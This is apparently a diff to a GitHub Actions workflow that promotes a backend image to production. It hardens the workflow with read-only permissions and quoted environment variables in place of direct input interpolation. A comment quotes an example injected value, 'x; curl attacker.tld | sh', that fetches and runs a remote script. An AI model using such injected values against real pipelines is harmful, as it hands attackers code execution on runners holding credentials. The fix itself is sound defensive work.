@@ -15,6 +15,11 @@ on:
           - rolling
           - blue-green
 
+# Least privilege: none of these jobs write to the repository, and the default
+# GITHUB_TOKEN grants more than they need.
+permissions:
+  contents: read
+
 jobs:
   deploy-production:
     name: Promote to Production
@@ -32,12 +37,22 @@ jobs:
           password: ${{ secrets.REGISTRY_PASSWORD }}
 
       - name: Tag image for production
+        # Values reach the shell through the environment, quoted, rather than
+        # being pasted into the script text. `image_tag` is a workflow_dispatch
+        # input, so interpolating it directly made a value like
+        # `x; curl attacker.tld | sh` execute on a runner holding the registry
+        # credentials and the production SSH key. Passing secrets this way also
+        # keeps them out of process arguments and `set -x` traces.
+        env:
+          REGISTRY_URL: ${{ secrets.REGISTRY_URL }}
+          IMAGE_TAG: ${{ inputs.image_tag }}
         run: |
-          docker pull ${{ secrets.REGISTRY_URL }}/marketplace-backend:${{ inputs.image_tag }}
+          set -euo pipefail
+          docker pull "$REGISTRY_URL/marketplace-backend:$IMAGE_TAG"
           docker tag \
-            ${{ secrets.REGISTRY_URL }}/marketplace-backend:${{ inputs.image_tag }} \
-            ${{ secrets.REGISTRY_URL }}/marketplace-backend:production-latest
-          docker push ${{ secrets.REGISTRY_URL }}/marketplace-backend:production-latest
+            "$REGISTRY_URL/marketplace-backend:$IMAGE_TAG" \
+            "$REGISTRY_URL/marketplace-backend:production-latest"
+          docker push "$REGISTRY_URL/marketplace-backend:production-latest"
 
       - name: Deploy (rolling)
         if: inputs.strategy == 'rolling'
